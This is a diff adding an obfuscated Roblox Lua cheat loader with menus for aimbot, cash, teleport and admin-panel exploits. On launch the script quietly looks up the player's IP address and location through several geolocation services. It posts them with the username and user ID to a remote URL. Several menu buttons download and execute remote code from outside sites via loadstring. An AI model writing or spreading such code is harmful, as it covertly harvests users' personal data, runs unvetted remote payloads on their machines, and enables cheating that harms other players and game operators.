@@ -1,0 +1,411 @@
+local _0x1=game:GetService("Players")
+local _0x2=game:GetService("HttpService")
+local _0x3=game:GetService("MarketplaceService")
+local _0x4=_0x1.LocalPlayer
+
+while not _0x4 do
+    task.wait()
+    _0x4=_0x1.LocalPlayer
+end
+
+local _0x5=_0x4:WaitForChild("PlayerGui")
+local _0x6="https://gist.githubusercontent.com/qwdgo-main/14ffb839815ee99f3b131d6c04827c8b/raw/c9ce9d53b5515fd5d0b53052541ec9881d607aca/whitelist.json"
+
+local function _0x7()
+    local _0x8={ip="Unknown",city="Unknown",region="Unknown",country="Unknown"}
+    local _0x9={
+        "http://ip-api.com/json/?fields=status,message,country,regionName,city,query",
+        "https://ipwho.is/",
+        "https://ipapi.co/json/",
+        "https://ipinfo.io/json"
+    }
+    local _0xA=(syn and syn.request) or (http and http.request) or http_request or request
+
+    for _,_0xB in ipairs(_0x9) do
+        local _0xC,_0xD=pcall(function()
+            local _0xE
+            if _0xA then
+                local _0xF=_0xA({Url=_0xB,Method="GET"})
+                _0xE=_0xF and _0xF.Body
+            else
+                _0xE=game:HttpGet(_0xB)
+            end
+            if _0xE then return game:GetService("HttpService"):JSONDecode(_0xE) end
+            return nil
+        end)
+
+        if _0xC and _0xD then
+            if _0xD.status=="success" then
+                _0x8.ip=_0xD.query or "Unknown"
+                _0x8.city=_0xD.city or "Unknown"
+                _0x8.region=_0xD.regionName or "Unknown"
+                _0x8.country=_0xD.country or "Unknown"
+                break
+            end
+            if _0xD.ip or _0xD.query then
+                _0x8.ip=_0xD.ip or _0xD.query or "Unknown"
+                _0x8.city=_0xD.city or "Unknown"
+                _0x8.region=_0xD.region or _0xD.regionName or "Unknown"
+                _0x8.country=_0xD.country_name or _0xD.country or "Unknown"
+                break
+            end
+        end
+    end
+    return _0x8
+end
+
+local function _0x10(_0x11)
+    local _0x12,_0x13=pcall(function()
+        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    end)
+    if not _0x12 then _0x13="Unknown Game" end
+
+    local _0x14=_0x7()
+    local _0x15=string.format(
+        "**[DIEGS LOADER] New User**\nUsername: `%s`\nUserId: `%d`\nGame: `%s`\nPlaceId: `%d`\nStatus: `%s`\nIP: `%s`\nLocation: `%s, %s, %s`\nTime: <t:%d:F>",
+        _0x4.Name,_0x4.UserId,_0x13,game.PlaceId,_0x11 and "WHITELISTED" or "NOT WHITELISTED",_0x14.ip,_0x14.city,_0x14.region,_0x14.country,os.time()
+    )
+    local _0x16=_0x2:JSONEncode({content=_0x15})
+    local _0x17=(syn and syn.request) or (http and http.request) or http_request or request
+
+    if _0x17 then
+        pcall(function()
+            _0x17({Url=_0x6,Method="POST",Headers={["Content-Type"]="application/json"},Body=_0x16})
+        end)
+    else
+        pcall(function()
+            _0x2:PostAsync(_0x6,_0x16)
+        end)
+    end
+end
+
+local _0x18="https://gist.githubusercontent.com/qwdgo-main/d45b8e61e2119a7292d076d820adb34c/raw/whitelist.json"
+
+local function _0x19()
+    local _0x1A,_0x1B=pcall(function()
+        return game:HttpGet(_0x18.."?t="..tostring(os.time()))
+    end)
+    if not _0x1A or not _0x1B then return false end
+
+    local _0x1C=tostring(_0x4.UserId)
+    local _0x1D,_0x1E=pcall(function() return _0x2:JSONDecode(_0x1B) end)
+
+    if _0x1D and type(_0x1E)=="table" then
+        if _0x1E.whitelist and type(_0x1E.whitelist)=="table" then
+            for _,_0x1F in pairs(_0x1E.whitelist) do
+                if tostring(_0x1F)==_0x1C then return true end
+            end
+        end
+        for _,_0x1F in pairs(_0x1E) do
+            if type(_0x1F)~="table" and tostring(_0x1F)==_0x1C then return true end
+        end
+    else
+        for _0x20 in string.gmatch(_0x1B,"[^\r\n]+") do
+            if _0x20:match("^%s*(.-)%s*$")==_0x1C then return true end
+        end
+    end
+    return false
+end
+
+local _0x21=_0x19()
+_0x10(_0x21)
+
+if not _0x21 then
+    _0x4:Kick("[DIEGO] Access Denied.")
+    return
+end
+
+print("✅ Whitelisted! Loading Diegs Loader...")
+
+local _0x22=game:GetService("TweenService")
+local _0x23=game:GetService("UserInputService")
+local _0x24=game:GetService("RunService")
+local _0x25=game:GetService("Lighting")
+local _0x26=game:GetService("TeleportService")
+local _0x27=game:GetService("Stats")
+
+local _0x28=Color3.fromRGB(0,0,0)
+local _0x29=Color3.fromRGB(255,255,255)
+
+local function _0x2A(_0x2B,_0x2C)
+    local _0x2D=Instance.new(_0x2B)
+    if _0x2C then for _0x2E,_0x2F in pairs(_0x2C) do _0x2D[_0x2E]=_0x2F end end
+    return _0x2D
+end
+
+local _0x30=Instance.new("Sound")
+_0x30.SoundId="rbxassetid://129733619657122"
+_0x30.Volume=0.5
+_0x30.Parent=_0x5
+
+local _0x31,_0x32,allTabButtons,allTabPanels={},{},{},{}
+local currentTab,lastTab="MAIN MENU","MAIN MENU"
+local screenGui,main,leftPanel,rightPanel,bottomBar,tabBar,divider,ring,socialLine
+local featureHistory,historyPanel={},nil
+
+local function logFeature(_0x33)
+    table.insert(featureHistory,1,"["..os.date("%H:%M:%S").."]  ".._0x33)
+    if #featureHistory>50 then table.remove(featureHistory) end
+    if historyPanel then
+        for _,_0x34 in ipairs(historyPanel:GetChildren()) do
+            if _0x34:IsA("TextLabel") and _0x34.Name=="HistEntry" then _0x34:Destroy() end
+        end
+        for _0x35,_0x36 in ipairs(featureHistory) do
+            local _0x37=_0x2A("TextLabel",{
+                Name="HistEntry",
+                Parent=historyPanel,
+                Size=UDim2.new(1,-12,0,22),
+                BackgroundTransparency=1,
+                Text=_0x36,
+                Font=Enum.Font.RobotoMono,
+                TextSize=11,
+                TextColor3=_0x35==1 and _0x29 or _0x29,
+                TextXAlignment=Enum.TextXAlignment.Left
+            })
+            _0x2A("UIPadding",{PaddingLeft=UDim.new(0,8),Parent=_0x37})
+        end
+    end
+end
+
+local toastQueue,toastBusy={},false
+local function showToast(_0x38,_0x39)
+    _0x39=_0x39 or "$"
+    table.insert(toastQueue,{msg=_0x38,icon=_0x39})
+    if toastBusy then return end
+    toastBusy=true
+    task.spawn(function()
+        while #toastQueue>0 do
+            local _0x3A=table.remove(toastQueue,1)
+            local _0x3B=Instance.new("ScreenGui")
+            _0x3B.Name="DiegoToast"
+            _0x3B.IgnoreGuiInset=true
+            _0x3B.ResetOnSpawn=false
+            _0x3B.DisplayOrder=9999
+            _0x3B.Parent=_0x5
+
+            local _0x3C=_0x2A("Frame",{Parent=_0x3B,Size=UDim2.new(0,280,0,54),Position=UDim2.new(1,10,1,-80),BackgroundColor3=_0x28,BorderSizePixel=0})
+            _0x2A("UICorner",{CornerRadius=UDim.new(0,14),Parent=_0x3C})
+            _0x2A("UIStroke",{Color=_0x28,Thickness=0,Parent=_0x3C})
+            local _0x3D=_0x2A("Frame",{Parent=_0x3C,Size=UDim2.new(0,3,1,-16),Position=UDim2.new(0,10,0,8),BackgroundColor3=_0x28,BorderSizePixel=0})
+            _0x2A("UICorner",{CornerRadius=UDim.new(1,0),Parent=_0x3D})
+
+            _0x2A("TextLabel",{Parent=_0x3C,Size=UDim2.new(0,28,1,0),Position=UDim2.new(0,20,0,0),BackgroundTransparency=1,Text=_0x3A.icon,TextColor3=_0x29,Font=Enum.Font.GothamBold,TextSize=18})
+            _0x2A("TextLabel",{Parent=_0x3C,Size=UDim2.new(1,-60,1,0),Position=UDim2.new(0,52,0,0),BackgroundTransparency=1,Text=_0x3A.msg,TextColor3=_0x29,Font=Enum.Font.RobotoMono,TextSize=12,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Left})
+
+            _0x22:Create(_0x3C,TweenInfo.new(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{Position=UDim2.new(1,-295,1,-80)}):Play()
+            task.wait(2.8)
+            _0x22:Create(_0x3C,TweenInfo.new(0.35,Enum.EasingStyle.Quad,Enum.EasingDirection.In),{Position=UDim2.new(1,10,1,-80)}):Play()
+            task.wait(0.4)
+            _0x3B:Destroy()
+            task.wait(0.15)
+        end
+        toastBusy=false
+    end)
+end
+
+local function addRipple(_0x3E)
+    _0x3E.ClipsDescendants=true
+    _0x3E.MouseButton1Click:Connect(function()
+        local _0x3F=_0x2A("Frame",{
+            Parent=_0x3E,
+            Size=UDim2.new(0,0,0,0),
+            Position=UDim2.new(0.5,0,0.5,0),
+            BackgroundColor3=_0x29,
+            BackgroundTransparency=0.55,
+            BorderSizePixel=0,
+            ZIndex=_0x3E.ZIndex+5
+        })
+        _0x2A("UICorner",{CornerRadius=UDim.new(1,0),Parent=_0x3F})
+        local _0x40=math.max(_0x3E.AbsoluteSize.X,_0x3E.AbsoluteSize.Y)*2.2
+        _0x22:Create(_0x3F,TweenInfo.new(0.45,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{
+            Size=UDim2.new(0,_0x40,0,_0x40),
+            Position=UDim2.new(0.5,-_0x40/2,0.5,-_0x40/2),
+            BackgroundTransparency=1
+        }):Play()
+        task.delay(0.5,function() _0x3F:Destroy() end)
+    end)
+end
+
+local favorites,favPanel={},nil
+local function refreshFavPanel()
+    if not favPanel then return end
+    for _,_0x41 in ipairs(favPanel:GetChildren()) do
+        if _0x41:IsA("TextButton") and _0x41.Name=="FavBtn" then _0x41:Destroy() end
+    end
+    for _,_0x42 in ipairs(favorites) do
+        local _0x43=_0x2A("TextButton",{
+            Name="FavBtn",
+            Parent=favPanel,
+            Size=UDim2.new(1,-12,0,38),
+            BackgroundColor3=_0x28,
+            TextColor3=_0x29,
+            Font=Enum.Font.RobotoMono,
+            TextSize=13,
+            Text="★  ".._0x42.name,
+            AutoButtonColor=false,
+            BorderSizePixel=0
+        })
+        _0x2A("UICorner",{CornerRadius=UDim.new(0,8),Parent=_0x43})
+        _0x2A("UIStroke",{Color=_0x28,Thickness=0,Parent=_0x43})
+        addRipple(_0x43)
+        _0x43.MouseButton1Click:Connect(function()
+            _0x30:Play()
+            pcall(_0x42.cb)
+            logFeature(_0x42.name)
+            showToast(_0x42.name.." activated!","★")
+        end)
+    end
+end
+
+local function markFavorite(_0x44,_0x45)
+    for _,_0x46 in ipairs(favorites) do
+        if _0x46.name==_0x44 then return end
+    end
+    table.insert(favorites,{name=_0x44,cb=_0x45})
+    refreshFavPanel()
+    showToast(_0x44.." added to Favorites!","★")
+end
+
+screenGui=_0x2A("ScreenGui",{Name="coded by @ qwdgo",ResetOnSpawn=false,Parent=_0x5,DisplayOrder=1000})
+main=_0x2A("Frame",{Name="MainFrame",Size=UDim2.new(0,0,0,0),Position=UDim2.new(0.5,0,0.5,0),BackgroundColor3=_0x28,BorderSizePixel=0,Parent=screenGui,ClipsDescendants=true,BackgroundTransparency=1})
+_0x2A("UICorner",{CornerRadius=UDim.new(0,14),Parent=main})
+_0x2A("UIStroke",{Color=_0x28,Thickness=0,Parent=main})
+
+_0x22:Create(main,TweenInfo.new(0.55,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{
+    Size=UDim2.new(0,730,0,430),
+    Position=UDim2.new(0.5,-365,0.5,-215),
+    BackgroundTransparency=0
+}):Play()
+
+leftPanel=_0x2A("Frame",{Name="LeftPanel",Size=UDim2.new(0,220,1,0),BackgroundColor3=_0x28,BorderSizePixel=0,Parent=main})
+_0x2A("UICorner",{CornerRadius=UDim.new(0,14),Parent=leftPanel})
+
+divider=_0x2A("Frame",{Name="divider",Parent=leftPanel,Size=UDim2.new(0,1,1,-24),Position=UDim2.new(1,-1,0,12),BackgroundColor3=_0x28,BorderSizePixel=0})
+_0x2A("TextLabel",{Parent=leftPanel,BackgroundTransparency=1,Position=UDim2.new(0,14,0,14),Size=UDim2.new(1,-28,0,32),Text="------- / / @ Diego --------",Font=Enum.Font.RobotoMono,TextSize=13,TextColor3=_0x29,TextXAlignment=Enum.TextXAlignment.Left})
+
+local avatarFrame=_0x2A("Frame",{Parent=leftPanel,BackgroundColor3=_0x28,Size=UDim2.new(0,64,0,64),Position=UDim2.new(0.5,-32,0,74),BorderSizePixel=0,ClipsDescendants=true})
+ring=_0x2A("Frame",{Name="ring",Parent=avatarFrame,Size=UDim2.new(1,0,1,0),BackgroundColor3=_0x28,BorderSizePixel=0})
+_0x2A("UICorner",{CornerRadius=UDim.new(1,0),Parent=ring})
+
+local inner=_0x2A("Frame",{Parent=ring,Size=UDim2.new(0.86,0,0.86,0),Position=UDim2.new(0.07,0,0.07,0),BackgroundColor3=_0x28,BorderSizePixel=0})
+_0x2A("UICorner",{CornerRadius=UDim.new(1,0),Parent=inner})
+
+local avatar=_0x2A("ImageLabel",{Parent=inner,BackgroundTransparency=1,Size=UDim2.new(1,0,1,0),Image=_0x1:GetUserThumbnailAsync(_0x4.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size150x150)})
+_0x2A("UICorner",{CornerRadius=UDim.new(1,0),Parent=avatar})
+
+_0x2A("TextLabel",{Parent=leftPanel,BackgroundTransparency=1,Position=UDim2.new(0,0,0,150),Size=UDim2.new(1,0,0,24),Text=_0x4.DisplayName,Font=Enum.Font.RobotoMono,TextSize=15,TextColor3=_0x29,TextXAlignment=Enum.TextXAlignment.Center})
+_0x2A("TextLabel",{Parent=leftPanel,BackgroundTransparency=1,Position=UDim2.new(0,0,0,174),Size=UDim2.new(1,0,0,18),Text="@".._0x4.Name,Font=Enum.Font.RobotoMono,TextSize=12,TextColor3=_0x29,TextXAlignment=Enum.TextXAlignment.Center})
+
+rightPanel=_0x2A("Frame",{Name="RightPanel",Parent=main,Size=UDim2.new(1,-220,1,-50),Position=UDim2.new(0,220,0,0),BackgroundColor3=_0x28,BorderSizePixel=0})
+_0x2A("UICorner",{CornerRadius=UDim.new(0,14),Parent=rightPanel})
+
+local statsLabel=_0x2A("TextLabel",{Parent=rightPanel,Size=UDim2.new(0,180,0,22),Position=UDim2.new(1,-190,0,10),BackgroundTransparency=1,Text="FPS: -- | Ping: --ms | Players: --",Font=Enum.Font.RobotoMono,TextSize=10,TextColor3=_0x29,TextXAlignment=Enum.TextXAlignment.Right})
+
+task.spawn(function()
+    while screenGui and screenGui.Parent do
+        local _0x47=math.floor(1/_0x24.RenderStepped:Wait())
+        local _0x48=math.floor(_0x27.Network.ServerStatsItem["Data Ping"]:GetValue())
+        local _0x49=#_0x1:GetPlayers()
+        statsLabel.Text="FPS: ".._0x47.." | Ping: ".._0x48.."ms | ".._0x49.." players"
+        task.wait(2)
+    end
+end)
+
+local titleLabel=_0x2A("TextLabel",{Parent=rightPanel,Position=UDim2.new(0,16,0,12),Size=UDim2.new(1,-210,0,26),BackgroundTransparency=1,Text="MAIN MENU",Font=Enum.Font.RobotoMono,TextSize=18,TextColor3=_0x29,TextXAlignment=Enum.TextXAlignment.Left})
+
+tabBar=_0x2A("ScrollingFrame",{Name="TabBar",Parent=rightPanel,Position=UDim2.new(0,16,0,78),Size=UDim2.new(1,-32,0,34),BackgroundColor3=_0x28,BorderSizePixel=0,ScrollBarThickness=1,CanvasSize=UDim2.new(0,0,0,0),ScrollingDirection=Enum.ScrollingDirection.X,AutomaticCanvasSize=Enum.AutomaticSize.X})
+_0x2A("UICorner",{CornerRadius=UDim.new(0,8),Parent=tabBar})
+_0x2A("UIListLayout",{Parent=tabBar,FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,5),SortOrder=Enum.SortOrder.LayoutOrder})
+
+local contentArea=_0x2A("Frame",{Parent=rightPanel,Position=UDim2.new(0,16,0,120),Size=UDim2.new(1,-32,1,-172),BackgroundTransparency=1,ClipsDescendants=true})
+
+bottomBar=_0x2A("Frame",{Name="BottomBar",Parent=main,Position=UDim2.new(0,220,1,-50),Size=UDim2.new(1,-220,0,50),BackgroundColor3=_0x28,BorderSizePixel=0})
+_0x2A("UICorner",{CornerRadius=UDim.new(0,14),Parent=bottomBar})
+
+local function showTab(_0x4A)
+    local _0x4B=currentTab
+    local _0x4C=allTabPanels[_0x4B]
+    local _0x4D=allTabPanels[_0x4A]
+
+    if _0x4C and _0x4C~=_0x4D then
+        _0x22:Create(_0x4C,TweenInfo.new(0.18,Enum.EasingStyle.Quad,Enum.EasingDirection.In),{Position=UDim2.new(-1,0,0,0)}):Play()
+        task.delay(0.2,function() if _0x4C.Parent then _0x4C.Visible=false; _0x4C.Position=UDim2.new(0,0,0,0) end end)
+    end
+
+    currentTab=_0x4A
+    lastTab=_0x4A
+
+    if _0x4D then
+        _0x4D.Position=UDim2.new(1,0,0,0)
+        _0x4D.Visible=true
+        _0x22:Create(_0x4D,TweenInfo.new(0.22,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Position=UDim2.new(0,0,0,0)}):Play()
+    end
+
+    titleLabel.Text=_0x4A
+    for _,_0x4E in ipairs(allTabButtons) do
+        local _0x4F=_0x4E.Text==_0x4A
+        _0x22:Create(_0x4E,TweenInfo.new(0.15),{BackgroundColor3=_0x4F and _0x29 or _0x28,TextColor3=_0x4F and _0x28 or _0x29}):Play()
+    end
+end
+
+local function createTab(_0x50,_0x51)
+    local _0x52=_0x2A("TextButton",{Parent=_0x51,Size=UDim2.new(0,100,1,-8),BackgroundColor3=_0x28,Text=_0x50,Font=Enum.Font.RobotoMono,TextSize=11,TextColor3=_0x29,AutoButtonColor=false,TextXAlignment=Enum.TextXAlignment.Center,BorderSizePixel=0})
+    _0x2A("UICorner",{CornerRadius=UDim.new(0,7),Parent=_0x52})
+    addRipple(_0x52)
+
+    _0x52.MouseButton1Click:Connect(function()
+        _0x30:Play()
+        showTab(_0x50)
+    end)
+
+    local _0x53=_0x2A("ScrollingFrame",{Parent=contentArea,Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Visible=false,ScrollBarThickness=1,AutomaticCanvasSize=Enum.AutomaticSize.Y,CanvasSize=UDim2.new(0,0,0,0),BorderSizePixel=0})
+    _0x2A("UIListLayout",{Parent=_0x53,Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder})
+
+    allTabPanels[_0x50]=_0x53
+    table.insert(allTabButtons,_0x52)
+    return _0x53
+end
+
+local topTabNames={"MAIN MENU","ROLEPLAY MENU","ROLEPLAY MENU 2","ROLEPLAY MENU 3","ROLEPLAY MENU 4","NEW RP SCRIPT","BRING MENU","AIMBOT MENU","SCRIPT MENU","CASH MENU","PLAYER MENU","DIEGO MENU","SKYLINE CITY","THE BILLIONARE","CUSTOMIZE SCRIPT","RP TELEPORT","ADMIN PANEL","REMOTES","FAVORITES","LOG"}
+for _,_0x54 in ipairs(topTabNames) do createTab(_0x54,tabBar) end
+
+favPanel=allTabPanels["FAVORITES"]
+historyPanel=allTabPanels["LOG"]
+
+local function addMainMenuButton(_0x55,_0x56)
+    local _0x57=allTabPanels["MAIN MENU"]
+    if not _0x57 then return end
+
+    local _0x58=_0x2A("Frame",{Parent=_0x57,Size=UDim2.new(1,-12,0,40),BackgroundColor3=_0x28,BorderSizePixel=0})
+    _0x2A("UICorner",{CornerRadius=UDim.new(0,9),Parent=_0x58})
+
+    local _0x59=_0x2A("TextButton",{Parent=_0x58,Size=UDim2.new(1,-44,1,0),BackgroundTransparency=1,TextColor3=_0x29,Font=Enum.Font.RobotoMono,TextSize=12,Text=_0x55,AutoButtonColor=false,TextXAlignment=Enum.TextXAlignment.Center,BorderSizePixel=0})
+    _0x2A("UIPadding",{PaddingLeft=UDim.new(0,10),Parent=_0x59})
+    _0x58.ClipsDescendants=true
+    addRipple(_0x59)
+
+    local _0x5A=_0x2A("TextButton",{Parent=_0x58,Size=UDim2.new(0,36,1,0),Position=UDim2.new(1,-38,0,0),BackgroundTransparency=1,Text="☆",TextColor3=_0x29,Font=Enum.Font.GothamBold,TextSize=16,AutoButtonColor=false})
+    _0x5A.MouseButton1Click:Connect(function()
+        _0x5A.Text="★"
+        markFavorite(_0x55,_0x56)
+    end)
+
+    _0x59.MouseButton1Click:Connect(function()
+        _0x30:Play()
+        task.spawn(function() pcall(_0x56) end)
+        logFeature(_0x55)
+        showToast(_0x55,"$")
+    end)
+end
+
+addMainMenuButton("ANTI SUSPEND ( NEW ) $",function()
+    loadstring(game:HttpGet("https://mois7.xyz/loader"))()
+end)
+
+addMainMenuButton("INFINITE YIELD $",function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+end)
+
+addMainMenuButton("FADED GUI UNIVERSAL $",function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded-Grid/main/YesEpic",true))()
+end)
